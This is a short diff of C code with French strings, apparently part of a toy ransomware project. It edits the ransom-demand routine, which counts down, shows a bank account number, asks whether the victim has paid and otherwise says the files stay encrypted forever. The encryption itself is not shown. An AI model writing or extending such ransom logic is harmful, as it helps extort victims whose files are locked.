@@ -92,16 +92,25 @@ int is_encrypted(char *filename) //Ici on assume que le nom de nos fichiers cryp
 }
 void timer (int mount)
 {
+	int is_paid = 0;
     for( int i = 10; i > 0; i--)
  	{
-    printf("Il vous reste %d secondes.\n", i);
+    	printf("Il vous reste %d secondes.\n", i);
 	printf("Compte bancaire : BE56751251151 \n");
-    sleep(1);
+    	sleep(1);
  	}
-	printf("Merci d'avoir payé : %d Euros \n",mount);
-
+	printf("Avez-vous payé ? (1=oui) \n");
+	scanf("%d",&is_paid);
+	if (is_paid == 1)
+	{
+		printf("Merci d'avoir payé : %d Euros \n",mount);
+	}
+	else
+	{
+		printf("Vos fichiers seront crypté à jamais!");
+	}
+	
 }
-
 int amount_to_pay(int nb)
 {
 	printf("Nombre de fichier crypté : %d	\n",nb);
